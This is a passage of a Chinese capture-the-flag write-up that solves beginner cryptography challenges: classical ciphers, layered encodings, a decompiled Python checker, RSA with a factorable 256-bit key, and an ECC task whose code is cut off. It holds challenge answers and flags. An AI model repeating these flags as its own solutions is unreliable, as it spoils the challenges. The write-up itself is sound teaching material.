你们继续走，看到前面也是热热闹闹的，同样的大红灯笼高高挂起，旁边呢好多人叽叽喳喳说个不停。你一看 大灯笼，上面还是一对字符，你正冥思苦想呢，小鱼神秘一笑，对你说道，我知道这个的答案是什么了</p><h2 id="解密"><a class="markdownIt-Anchor" href="#解密"></a> 解密</h2><p>  根据题目提示，应该是凯撒密码，观察题目附件<code>oknqdbqmoq&#123;kag_tmhq_xqmdzqp_omqemd_qzodkbfuaz&#125;</code>，应该是偏移量为14，复原得到答案：<code>cyberpeace&#123;you_have_learned_caesar_encryption&#125;</code>。</p><h1 id="morse"><a class="markdownIt-Anchor" href="#morse"></a> Morse</h1><h2 id="题目-3"><a class="markdownIt-Anchor" href="#题目-3"></a> 题目</h2><p>  难度系数： 1.0<br />  题目来源： poxlove3<br />  题目描述：小鱼得意的瞟了你一眼，神神气气的拿走了答对谜语的奖励，你心里暗暗较劲 想着下一个谜题一定要比小鱼更快的解出来。不知不觉你们走到了下一个谜题的地方，这个地方有些奇怪。 上面没什么提示信息，只是刻着一些0和1，感觉有着一些奇怪的规律，你觉得有些熟悉，但是就是想不起来 这些01代表着什么意思。一旁的小鱼看你眉头紧锁的样子，扑哧一笑，对你讲“不好意思我又猜到答案了。”(flag格式为cyberpeace{xxxxxxxxxx},均为小写)</p><h2 id="解答-2"><a class="markdownIt-Anchor" href="#解答-2"></a> 解答</h2><p>  根据附件的内容和题目提示，用摩斯密码解答，用<code>-</code>替换<code>1</code>，用<code>.</code>替换<code>0</code>，得到摩斯密码序列：</p><blockquote><p>– — .-. … . -.-. — -… . … … … — … -. - . .-. . … - … -. --.</p></blockquote><p>  解密后得到答案<code>morsecodeissointeresting</code>。</p><h1 id="幂数加密"><a class="markdownIt-Anchor" href="#幂数加密"></a> 幂数加密</h1><h2 id="题目-4"><a class="markdownIt-Anchor" href="#题目-4"></a> 题目</h2><p>  难度系数： 2.0<br />  题目来源： CFF2016<br />  题目描述：你和小鱼终于走到了最后的一个谜题所在的地方，上面写着一段话“亲爱的朋友， 很开心你对网络安全有这么大的兴趣，希望你一直坚持下去，不要放弃 ，学到一些知识， 走进广阔的安全大世界”，你和小鱼接过谜题，开始了耐心细致的解答。flag为cyberpeace{你解答出的八位大写字母}</p><h2 id="解答-3"><a class="markdownIt-Anchor" href="#解答-3"></a> 解答</h2><p>  根据附件字符串<code>8842101220480224404014224202480122</code>，以及题目中的提示<code>幂数加密</code>,<code>八位字母</code>。<br />  可以发现附件是用0分割的八个字符，每一段加起来之后得到数字<code>23,5,12,12,4,15,14,5</code>。对应英文字母位置得到答案为<code>WELLDONE</code>。</p><h1 id="railfence"><a class="markdownIt-Anchor" href="#railfence"></a> Railfence</h1><h2 id="题目-5"><a class="markdownIt-Anchor" href="#题目-5"></a> 题目</h2><p>  难度系数： 2.0<br />  题目来源： poxlove3<br />  题目描述：被小鱼一连将了两军，你心里更加不服气了。两个人一起继续往前走， 一路上杂耍卖艺的很多，但是你俩毫无兴趣，直直的就冲着下一个谜题的地方去了。 到了一看，这个谜面看起来就已经有点像答案了样子了，旁边还画着一张画，是一副农家小院的 图画，上面画着一个农妇在栅栏里面喂5只小鸡，你嘿嘿一笑对着小鱼说这次可是我先找到答案了。</p><h2 id="解答-4"><a class="markdownIt-Anchor" href="#解答-4"></a> 解答</h2><p>  根据题亩名称和题干，考虑用栅栏密码解题，将附件字符串重新排列。</p><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">c c e h g  </span><br><span class="line">y a e f n  </span><br><span class="line">p e o o b   </span><br><span class="line">e &#123; l c i  </span><br><span class="line">r g &#125; e p  </span><br><span class="line">r i e c _  </span><br><span class="line">o r a _ g</span><br></pre></td></tr></table></figure><p>  得到字符串<code>cyperrocae&#123;gireeol&#125;eahfocec_gnbip_g</code>,发现并没有什么卵用。</p><p>  百度之后发现还有一种WWW加密方式。</p><blockquote><p>对于字符串：123456789<br />key=3<br />1----5----9  \让数字以W型组织，同样是三组，但每组的数量不一定相同<br />-2–4-6–8<br />–3----7–<br />加密密文：159246837</p></blockquote><p>  回到本题，已知第一个斜线应该构成cyberpeace等字样，可构造解密图形如下：</p><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">c       c       e       h       g  </span><br><span class="line"> y     a e     f n     p e     o o  </span><br><span class="line">  b   e   &#123;   l   c   i   r   g   &#125;    </span><br><span class="line">   e p     r i     e c     _ o      </span><br><span class="line">    r       a       _       g</span><br></pre></td></tr></table></figure><p>  得到解密后的字符串为<code>cyberpeace&#123;railfence_cipher_gogogo&#125;</code></p><h1 id="不仅仅是morse"><a class="markdownIt-Anchor" href="#不仅仅是morse"></a> 不仅仅是Morse</h1><h2 id="题目-6"><a class="markdownIt-Anchor" href="#题目-6"></a> 题目</h2><p>  难度系数：2.0<br />  题目来源： poxlove3<br />  题目描述：“这个题目和我们刚刚做的那个好像啊但是为什么按照刚刚的方法做出来答案却不对呢” ，你奇怪的问了问小鱼，“可能是因为还有一些奇怪的加密方式在里面吧，我们在仔细观察观察”。两个人 安安静静的坐下来开始思考，很耐心的把自己可以想到的加密方式一种种的过了一遍，十多分钟后两个人 异口同声的说“我想到了！”。一种食物,格式为cyberpeace{小写的你解出的答案}</p><h2 id="解答-5"><a class="markdownIt-Anchor" href="#解答-5"></a> 解答</h2><p>  把题目附件先用莫斯密码解密，得到提示<code>maybe have another decode</code>和一串字符串，观察全部采用AB构成，考虑培根密码，分组如下：</p><blockquote><p>aaaaa baabb baabb aaaaa aaaba ababa aaaaa abbab aaabb aaabb aabaa aabab aabaa abbab aaaba aabaa babba abbba baaab ababb aaabb abaaa baaba abaaa abbab baabb aabaa baaab aabaa baaba baabb abaaa abbab aabba</p></blockquote><p>  根据培根密码表，得到解密后的字符串<code>ATTACKANDDEFENCEWORLDISINTERESTING</code>。</p><h1 id="混合编码"><a class="markdownIt-Anchor" href="#混合编码"></a> 混合编码</h1><h2 id="题目-7"><a class="markdownIt-Anchor" href="#题目-7"></a> 题目</h2><p>  难度系数： 2.0<br />  题目来源： poxlove3<br />  题目描述：经过了前面那么多题目的历练，耐心细致在解题当中是 必不可少的品质，刚巧你们都有，你和小鱼越来越入迷。那么走向了下一个题目，这个题目好长 好长，你知道你们只要细心细致，答案总会被你们做出来的，你们开始慢慢的尝试，慢慢的猜想 ，功夫不负有心人，在你们耐心的一步步的解答下，答案跃然纸上，你俩默契一笑，相视击掌 走向了下面的挑战。格式为cyberpeace{小写的你解出的答案}</p><h2 id="解答-6"><a class="markdownIt-Anchor" href="#解答-6"></a> 解答</h2><p>  看到附件格式，首先想到用base64解密,解密得到：<br /><code>&amp;#76;&amp;#122;&amp;#69;&amp;#120;&amp;#79;&amp;#83;&amp;#56;&amp;#120;&amp;#77;&amp;#68;&amp;#69;&amp;#118;&amp;#77;&amp;#84;&amp;#65;&amp;#52;&amp;#76;&amp;#122;&amp;#107;&amp;#53;&amp;#76;&amp;#122;&amp;#69;&amp;#120;&amp;#77;&amp;#83;&amp;#56;&amp;#120;&amp;#77;&amp;#68;&amp;#107;&amp;#118;&amp;#77;&amp;#84;&amp;#65;&amp;#120;&amp;#76;&amp;#122;&amp;#69;&amp;#120;&amp;#78;&amp;#105;&amp;#56;&amp;#120;&amp;#77;&amp;#84;&amp;#69;&amp;#118;&amp;#79;&amp;#84;&amp;#99;&amp;#118;&amp;#77;&amp;#84;&amp;#69;&amp;#50;&amp;#76;&amp;#122;&amp;#69;&amp;#120;&amp;#78;&amp;#105;&amp;#56;&amp;#53;&amp;#78;&amp;#121;&amp;#56;&amp;#53;&amp;#79;&amp;#83;&amp;#56;&amp;#120;&amp;#77;&amp;#68;&amp;#99;&amp;#118;&amp;#79;&amp;#84;&amp;#99;&amp;#118;&amp;#77;&amp;#84;&amp;#69;&amp;#119;&amp;#76;&amp;#122;&amp;#69;&amp;#119;&amp;#77;&amp;#67;&amp;#56;&amp;#120;&amp;#77;&amp;#68;&amp;#65;&amp;#118;&amp;#77;&amp;#84;&amp;#65;&amp;#120;&amp;#76;&amp;#122;&amp;#69;&amp;#119;&amp;#77;&amp;#105;&amp;#56;&amp;#120;&amp;#77;&amp;#68;&amp;#69;&amp;#118;&amp;#77;&amp;#84;&amp;#69;&amp;#119;&amp;#76;&amp;#122;&amp;#107;&amp;#53;&amp;#76;&amp;#122;&amp;#69;&amp;#119;&amp;#77;&amp;#83;&amp;#56;&amp;#120;&amp;#77;&amp;#84;&amp;#107;&amp;#118;&amp;#77;&amp;#84;&amp;#69;&amp;#120;&amp;#76;&amp;#122;&amp;#69;&amp;#120;&amp;#78;&amp;#67;&amp;#56;&amp;#120;&amp;#77;&amp;#68;&amp;#103;&amp;#118;&amp;#77;&amp;#84;&amp;#65;&amp;#119;</code></p><p>  是HTML编码，再次解密得到：</p><blockquote><p>LzExOS8xMDEvMTA4Lzk5LzExMS8xMDkvMTAxLzExNi8xMTEvOTcvMTE2LzExNi85Ny85OS8xMDcvOTcvMTEwLzEwMC8xMDAvMTAxLzEwMi8xMDEvMTEwLzk5LzEwMS8xMTkvMTExLzExNC8xMDgvMTAw</p></blockquote><p>  用Base64再次解码得到：</p><blockquote><p>/119/101/108/99/111/109/101/116/111/97/116/116/97/99/107/97/110/100/100/101/102/101/110/99/101/119/111/114/108/100</p></blockquote><p>  转换为ASCII码得到答案：<code>welcometoattackanddefenceworld</code>。</p><h1 id="easy_rsa"><a class="markdownIt-Anchor" href="#easy_rsa"></a> easy_RSA</h1><h2 id="题目-8"><a class="markdownIt-Anchor" href="#题目-8"></a> 题目</h2><p>  难度系数： 3.0<br />  题目来源： poxlove3<br />  题目描述：解答出来了上一个题目的你现在可是春风得意，你们走向了下一个题目所处的地方 你一看这个题目傻眼了，这明明是一个数学题啊！！！可是你的数学并不好。扭头看向小鱼，小鱼哈哈一笑 ，让你在学校里面不好好听讲现在傻眼了吧~来我来！三下五除二，小鱼便把这个题目轻轻松松的搞定了。flag格式为cyberpeace{小写的你解出的答案}</p><h2 id="解答-7"><a class="markdownIt-Anchor" href="#解答-7"></a> 解答</h2><p>  用Rsa Tool 2，注意Number Base要选10进制，然后E使用16进制表示的，10进制的17要转换成16进制的11，然后计算D值。</p><p><a href="https://pic.lufer.cc/image/dACE"><img src="https://pic.lufer.cc/images/2021/08/12/image.md.png" alt="" /></a></p><p>  得到答案<code>cyberpeace&#123;125631357777427553&#125;</code>。</p><h1 id="easychallenge"><a class="markdownIt-Anchor" href="#easychallenge"></a> easychallenge</h1><h2 id="题目-9"><a class="markdownIt-Anchor" href="#题目-9"></a> 题目</h2><p>  难度系数： 3.0<br />  题目来源： NJUPT_CTF<br />  题目描述：你们走到了一个冷冷清清的谜题前面，小鱼看着题目给的信息束手无策，丈二和尚摸不着头脑 ，你嘿嘿一笑，拿出来了你随身带着的笔记本电脑，噼里啪啦的敲起来了键盘，清晰的函数逻辑和流程出现在 了电脑屏幕上，你敲敲键盘，更改了几处地方，运行以后答案变出现在了电脑屏幕上。</p><h2 id="解答-8"><a class="markdownIt-Anchor" href="#解答-8"></a> 解答</h2><p>  逆向pyc文件，使用uncompyle6。</p><p><code>uncompyle6 -o . ctf.pyc</code>。</p><p>  得到逆向的py文件，代码如下：</p><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> base64</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">encode1</span>(<span class="params">ans</span>):</span></span><br><span class="line">    s = <span class="string">&#x27;&#x27;</span></span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> ans:</span><br><span class="line">        x = <span class="built_in">ord</span>(i) ^ <span class="number">36</span></span><br><span class="line">        x = x + <span class="number">25</span></span><br><span class="line">        s += <span class="built_in">chr</span>(x)</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> s</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">encode2</span>(<span class="params">ans</span>):</span></span><br><span class="line">    s = <span class="string">&#x27;&#x27;</span></span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> ans:</span><br><span class="line">        x = <span class="built_in">ord</span>(i) + <span class="number">36</span></span><br><span class="line">        x = x ^ <span class="number">36</span></span><br><span class="line">        s += <span class="built_in">chr</span>(x)</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> s</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">encode3</span>(<span class="params">ans</span>):</span></span><br><span class="line">    <span class="keyword">return</span> base64.b32encode(ans)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">flag = <span class="string">&#x27; &#x27;</span></span><br><span class="line"><span class="built_in">print</span> <span class="string">&#x27;Please Input your flag:&#x27;</span></span><br><span class="line">flag = raw_input()</span><br><span class="line">final = <span class="string">&#x27;UC7KOWVXWVNKNIC2XCXKHKK2W5NLBKNOUOSK3LNNVWW3E===&#x27;</span></span><br><span class="line"><span class="keyword">if</span> encode3(encode2(encode1(flag))) == final:</span><br><span class="line">    <span class="built_in">print</span> <span class="string">&#x27;correct&#x27;</span></span><br><span class="line"><span class="keyword">else</span>:</span><br><span class="line">    <span class="built_in">print</span> <span class="string">&#x27;wrong&#x27;</span></span><br></pre></td></tr></table></figure><p>  可以看出正确的flag应该是经过三个函数加密后与final字符串相等，所以只需要将final作为输入，经过三次相反的解密过程就可以得到正确的flag，这里我用的是python3，所以做了一些兼容性的修改。</p><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> base64</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">encode1</span>(<span class="params">ans</span>):</span></span><br><span class="line">    s = <span class="string">&#x27;&#x27;</span></span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> ans:</span><br><span class="line">        x = <span class="built_in">ord</span>(i) ^ <span class="number">36</span></span><br><span class="line">        x = x + <span class="number">25</span></span><br><span class="line">        s += <span class="built_in">chr</span>(x)</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> s</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">decode1</span>(<span class="params">ans</span>):</span></span><br><span class="line">    s = <span class="string">&#x27;&#x27;</span></span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> ans:</span><br><span class="line">        x = <span class="built_in">ord</span>(i) - <span class="number">25</span></span><br><span class="line">        x = x ^ <span class="number">36</span></span><br><span class="line">        s += <span class="built_in">chr</span>(x)</span><br><span class="line">    <span class="keyword">return</span> s</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">encode2</span>(<span class="params">ans</span>):</span></span><br><span class="line">    s = <span class="string">&#x27;&#x27;</span></span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> ans:</span><br><span class="line">        x = <span class="built_in">ord</span>(i) + <span class="number">36</span></span><br><span class="line">        x = x ^ <span class="number">36</span></span><br><span class="line">        s += <span class="built_in">chr</span>(x)</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> s</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">decode2</span>(<span class="params">ans</span>):</span></span><br><span class="line">    s = <span class="string">&#x27;&#x27;</span></span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> ans:</span><br><span class="line">        x = <span class="built_in">ord</span>(i) ^ <span class="number">36</span></span><br><span class="line">        x = x - <span class="number">36</span></span><br><span class="line">        s += <span class="built_in">chr</span>(x)</span><br><span class="line">    <span class="keyword">return</span> s</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">encode3</span>(<span class="params">ans</span>):</span></span><br><span class="line">    <span class="keyword">return</span> base64.b32encode(ans)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">decode3</span>(<span class="params">ans</span>):</span></span><br><span class="line">    <span class="keyword">return</span> base64.b32decode(ans)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment"># flag = &#x27; &#x27;</span></span><br><span class="line"><span class="comment"># print(&#x27;Please Input your flag:&#x27;)</span></span><br><span class="line"><span class="comment"># flag = input()</span></span><br><span class="line">final = <span class="string">&#x27;UC7KOWVXWVNKNIC2XCXKHKK2W5NLBKNOUOSK3LNNVWW3E===&#x27;</span></span><br><span class="line">flag = decode1(decode2(decode3(final).decode(<span class="string">&#x27;ISO-8859-1&#x27;</span>)))</span><br><span class="line">print(flag)</span><br><span class="line"><span class="comment"># if encode3(encode2(encode1(flag))) == final:</span></span><br><span class="line"><span class="comment">#     print(&#x27;correct&#x27;)</span></span><br><span class="line"><span class="comment"># else:</span></span><br><span class="line"><span class="comment">#     print(&#x27;wrong&#x27;)</span></span><br></pre></td></tr></table></figure><p>  这里这个decode选项<code>ISO-8859-1</code>我也不知道是为什么，尝试了<code>utf-8</code>和<code>unicode-escape</code>之类的全部是乱码无法解析，只有这个才能正常显示答案：<code>cyberpeace&#123;interestinghhhhh&#125;</code>。</p><h1 id="转轮机加密"><a class="markdownIt-Anchor" href="#转轮机加密"></a> 转轮机加密</h1><h2 id="题目-10"><a class="markdownIt-Anchor" href="#题目-10"></a> 题目</h2><p>  难度系数： 4.0<br />  题目来源： ISCC2017<br />  题目描述：你俩继续往前走，来到了前面的下一个关卡，这个铺面墙上写了好多奇奇怪怪的 英文字母，排列的的整整齐齐，店面前面还有一个大大的类似于土耳其旋转烤肉的架子，上面一圈圈的 也刻着很多英文字母，你是一个小历史迷，对于二战时候的历史刚好特别熟悉，一拍大腿：“嗨呀！我知道 是什么东西了！”。提示：托马斯·杰斐逊。 flag，是字符串，小写。</p><h2 id="解答-9"><a class="markdownIt-Anchor" href="#解答-9"></a> 解答</h2><p>  根据秘钥的顺序决定轮子的顺序，根据密文的字母决定每一个轮子的重新排列。<br />对于原文：</p><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">&lt; ZWAXJGDLUBVIQHKYPNTCRMOSFE &lt;  </span><br><span class="line">&lt; KPBELNACZDTRXMJQOYHGVSFUWI &lt;  </span><br><span class="line">&lt; BDMAIZVRNSJUWFHTEQGYXPLOCK &lt;  </span><br><span class="line">&lt; RPLNDVHGFCUKTEBSXQYIZMJWAO &lt;  </span><br><span class="line">&lt; IHFRLABEUOTSGJVDKCPMNZQWXY &lt;  </span><br><span class="line">&lt; AMKGHIWPNYCJBFZDRUSLOQXVET &lt;  </span><br><span class="line">&lt; GWTHSPYBXIZULVKMRAFDCEONJQ &lt;  </span><br><span class="line">&lt; NOZUTWDCVRJLXKISEFAPMYGHBQ &lt;  </span><br><span class="line">&lt; XPLTDSRFHENYVUBMCQWAOIKZGJ &lt;  </span><br><span class="line">&lt; UDNAJFBOWTGVRSCZQKELMXYIHP &lt;  </span><br><span class="line">&lt; MNBVCXZQWERTPOIUYALSKDJFHG &lt;    </span><br><span class="line">&lt; LVNCMXZPQOWEIURYTASBKJDFHG &lt;  </span><br><span class="line">&lt; JZQAWSXCDERFVBGTYHNUMKILOP &lt;  </span><br></pre></td></tr></table></figure><p>  根据秘钥：</p><blockquote><p>密钥为：2,3,7,5,13,12,9,1,8,10,4,11,6<br />密文为： N F Q K S  E  V O Q O  F N  P</p></blockquote><p>  进行重新排列后可以得到一个通顺的单词就是答案：</p><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">&lt; NACZDTRXMJQOYHGVS F UWIKPBEL &lt;   </span><br><span class="line">&lt; FHTEQGYXPLOCKBDMA I ZVRNSJUW &lt;   </span><br><span class="line">&lt; QGWTHSPYBXIZULVKM R AFDCEONJ &lt;  </span><br><span class="line">&lt; KCPMNZQWXYIHFRLAB E UOTSGJVD &lt;   </span><br><span class="line">&lt; SXCDERFVBGTYHNUMK I LOPJZQAW &lt;  </span><br><span class="line">&lt; EIURYTASBKJDFHGLV N CMXZPQOW &lt;   </span><br><span class="line">&lt; VUBMCQWAOIKZGJXPL T DSRFHENY &lt;  </span><br><span class="line">&lt; OSFEZWAXJGDLUBVIQ H KYPNTCRM &lt;  </span><br><span class="line">&lt; QNOZUTWDCVRJLXKIS E FAPMYGHB &lt;  </span><br><span class="line">&lt; OWTGVRSCZQKELMXYI H PUDNAJFB &lt;   </span><br><span class="line">&lt; FCUKTEBSXQYIZMJWA O RPLNDVHG &lt;    </span><br><span class="line">&lt; NBVCXZQWERTPOIUYA L SKDJFHGM &lt;   </span><br><span class="line">&lt; PNYCJBFZDRUSLOQXV E TAMKGHIW &lt; </span><br></pre></td></tr></table></figure><h1 id="normal_rsa"><a class="markdownIt-Anchor" href="#normal_rsa"></a> Normal_RSA</h1><h2 id="题目-11"><a class="markdownIt-Anchor" href="#题目-11"></a> 题目</h2><p>  难度系数： 5.0<br />  题目来源： PCTF<br />  题目描述：你和小鱼走啊走走啊走，走到下一个题目一看你又一愣，怎么还是一个数学题啊 小鱼又一笑，hhhh数学在密码学里面很重要的！现在知道吃亏了吧！你哼一声不服气，我知道数学 很重要了！但是工具也很重要的，你看我拿工具把他解出来！你打开电脑折腾了一会还真的把答案 做了出来，小鱼有些吃惊，向你投过来一个赞叹的目光</p><h2 id="解答-10"><a class="markdownIt-Anchor" href="#解答-10"></a> 解答</h2><p>  附件是enc和pem文件，先用openssl解析public.pem</p><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">OpenSSL&gt; rsa -pubin -text -modulus -in warmup -in pubkey.pem</span><br><span class="line">RSA Public-Key: (256 bit)</span><br><span class="line">Modulus:</span><br><span class="line">    00:c2:63:6a:e5:c3:d8:e4:3f:fb:97:ab:09:02:8f:</span><br><span class="line">    1a:ac:6c:0b:f6:cd:3d:70:eb:ca:28:1b:ff:e9:7f:</span><br><span class="line">    be:30:dd</span><br><span class="line">Exponent: 65537 (0x10001)</span><br><span class="line">Modulus&#x3D;C2636AE5C3D8E43FFB97AB09028F1AAC6C0BF6CD3D70EBCA281BFFE97FBE30DD</span><br><span class="line">writing RSA key</span><br><span class="line">-----BEGIN PUBLIC KEY-----</span><br><span class="line">MDwwDQYJKoZIhvcNAQEBBQADKwAwKAIhAMJjauXD2OQ&#x2F;+5erCQKPGqxsC&#x2F;bNPXDr</span><br><span class="line">yigb&#x2F;+l&#x2F;vjDdAgMBAAE&#x3D;</span><br><span class="line">-----END PUBLIC KEY-----</span><br><span class="line">OpenSSL&gt;</span><br></pre></td></tr></table></figure><p>  得到E是<code>65537</code>，N是<code>C2636AE5C3D8E43FFB97AB09028F1AAC6C0BF6CD3D70EBCA281BFFE97FBE30DD</code>。</p><p>  把16进制的N转为10进制得到<code>87924348264132406875276140514499937145050893665602592992418171647042491658461</code>。</p><p>  通过大素数在线分解得到p和q分别为 <code>275127860351348928173285174381581152299</code>和<code>319576316814478949870590164193048041239</code>。</p><p>  后面的代码我没跑起来，总是报错，这里是复制网上的：</p><p>  使用rsatool，输入命令以下命令生成private.pem文件。</p><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">python rsatool.py -f PEM -o private.pem -p 275127860351348928173285174381581152299 -q 319576316814478949870590164193048041239 -e 65537</span><br></pre></td></tr></table></figure><p>  然后把private.pem和pubkey.pem、flag.enc放一个文件夹里，打开cmder，使用openssl用private.pem解密flag.enc文件并将明文生成txt文件</p><p>  输入命令：</p><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">rsautl -decrypt -in flag.enc -inkey private.pem -out flag.txt</span><br></pre></td></tr></table></figure><p>  成功生成flag.txt，得到答案<code>PCTF&#123;256b_i5_m3dium&#125;</code>。</p><h1 id="easy_ecc"><a class="markdownIt-Anchor" href="#easy_ecc"></a> easy_ECC</h1><h2 id="题目-12"><a class="markdownIt-Anchor" href="#题目-12"></a> 题目</h2><p>  难度系数： 6.0<br />  题目来源： XUSTCTF2016<br />  题目描述：转眼两个人又走到了下一个谜题的地方，这又是一种经典的密码学加密方式 而你刚好没有这个的工具，你对小鱼说“小鱼我知道数学真的很重要了，有了工具只是方便我们使用 懂了原理才能做到，小鱼你教我一下这个缇努怎么做吧！”在小鱼的一步步带领下，你终于明白了ECC 的基本原理，成功的解开了这个题目，两个人相视一笑，快步走向了下一个题目所在的位置。flag格式为cyberpeace{x+y的值}</p><h2 id="解答-11"><a class="markdownIt-Anchor" href="#解答-11"></a> 解答</h2><p>  并不会做，看都看不懂，抄的代码。</p><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> collections</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">inverse_mod</span>(<span class="params">k, p</span>):</span></span><br><span class="line">    <span class="string">&quot;&quot;&quot;Returns the inverse of k modulo p.</span></span><br><span class="line"><span class="string">   This function returns the only integer x such that (x * k) % p == 1.</span></span><br><span class="line"><span class="string">   k must be non-zero and p must be a prime.</span></span><br><span class="line"><span class="string">   &quot;&quot;&quot;</span></span><br><span class="line">    <span class="keyword">if</span> k == <span class="number">0</span>:</span><br><span class="line">        <span class="keyword">raise</span> ZeroDivisionError(<span class="string">&#x27;division by zero&#x27;</span>)</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> k &lt; <span class="number">0</span>:</span><br><span class="line">        <span class="comment"># k ** -1 = p - (-k) ** -1 (mod p)</span></span><br><span class="line">        <span class="keyword">return</span> p - inverse_mod(-k, p)</span><br><span class="line"></span><br><span class="line">    <span class="comment"># Extended Euclidean algorithm.</span></span><br><span class="line">    s, old_s = <span class="number">0</span>, <span class="number">1</span></span><br><span class="line">    t, old_t = <span class="number">1</span>, <span class="number">0</span></span><br><span class="line">    r, old_r = p, k</span><br><span class="line"></span><br><span class="line">    <span class="keyword">while</span> r != <span class="number">0</span>:</span><br><span class="line">        quotient = old_r // r</span><br><span class="line">        old_r, r = r, old_r - quotient * r</span><br><span class="line">        old_s, s = s, old_s - quotient * s</span><br><span class="line">        old_t, t = t, old_t - quotient * t</span><br><span class="line"></span><br><span class="line">    gcd, x, y = old_r, old_s, old_t</span><br><span class="line"></span><br><span class="line">    <span class="keyword">assert</span> gcd == <span class="number">1</span></span><br><span class="line">    <span class="keyword">assert</span> (k * x) % p == <span class="number">1</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> x % p</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment"># Functions that work on curve points #########################################</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">is_on_curve</span>(<span class="params">point</span>):</span></span><br><span class="line">    <span class="string">&quot;&quot;&quot;Returns True if the given point lies on the elliptic curve.&quot;&quot;&quot;</span></span><br><span class="line">    <span class="keyword">if</span> point <span class="keyword">is</span> <span class="literal">None</span>:</span><br><span class="line">        <span class="comment"># None represents the point at infinity.</span></span><br><span class="line">        <span class="keyword">return</span> <span class="literal">True</span></span><br><span class="line"></span><br><span class="line">    x, y = point</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> (y * y - x * x * x - curve.a * x - curve.b) % curve.p == <span class="number">0</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">point_neg</span>(<span class="params">point</span>):</span></span><br><span class="line">    <span class="string">&quot;&quot;&quot;Returns -point.&quot;&quot;&quot;</span></span><br><span class="line">    <span class="keyword">assert</span> is_on_curve(point)</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> point <span class="keyword">is</span> <span class="literal">None</span>:</span><br><span class="line">        <span class="comment"># -0 = 0</span></span><br><span class="line">        <span class="keyword">return</span> <span class="literal">None</span></span><br><span class="line"></span><br><span class="line">    x, y = point</span><br><span class="line">    result = (x, -y % curve.p)</span><br><span class="line"></span><br><span class="line">    <span class="keyword">assert</span> is_on_curve(result)</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> result</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">point_add</span>(<span class="params">point1, point2</span>):</span></span><br><span class="line">    <span class="string">&quot;&quot;&quot;Returns the result of point1 + point2 according to the group law.&quot;&quot;&quot;</span></span><br><span class="line">    <span class="keyword">assert</span> is_on_curve(point1)</span><br><span class="line">    <span class="keyword">assert</span> is_on_curve(point2)</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> point1 <span class="keyword">is</span> <span class="literal">None</span>:</span><br><span class="line">        <span class="comment"># 0 + point2 = point2</span></span><br><span class="line">        <span class="keyword">return</span> point2</span><br><span class="line">    <span class="keyword">if</span> point2 <span class="keyword">is</span> <span class="literal">None</span>:</span><br><span class="line">        <span class="comment"># point1 + 0 = point1</span></span><br><span class="line">        <span class="keyword">return</span> point1</span><br><span class="line"></span><br><span class="line">    x1, y1 = point1</span><br><span class="line">    x2, y2 = point2</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> x1 == x2 <span class="keyword">and</span> y1 != y2:</span><br><span class="line">        <span class="comment"># point1 + (-point1) = 0</span></span><br><span class="line">        <span class="keyword">return</span> <span class="literal">None</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> x1 == x2:</span><br><span class="line">        <span class="comment"># This is the case point1 == point2.</span></span><br><span class="line">        m = (<span class="number">3</span> * x1 * x1 + curve.a) * inverse_mod(<span class="number">2</span> * y1, curve.p)</span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        <span class="comment"># This is the case point1 != point2.</span></span><br><span class="line">        m = (y1 - y2) * inverse_mod(x1 - x2, curve.p)</span><br><span class="line"></span><br><span class="line">    x3 = m * m - x1 - x2</span><br><span class="line">    y3 = y1 + m * (x3 - x1)</span><br><span class="line">    result = (x3 % 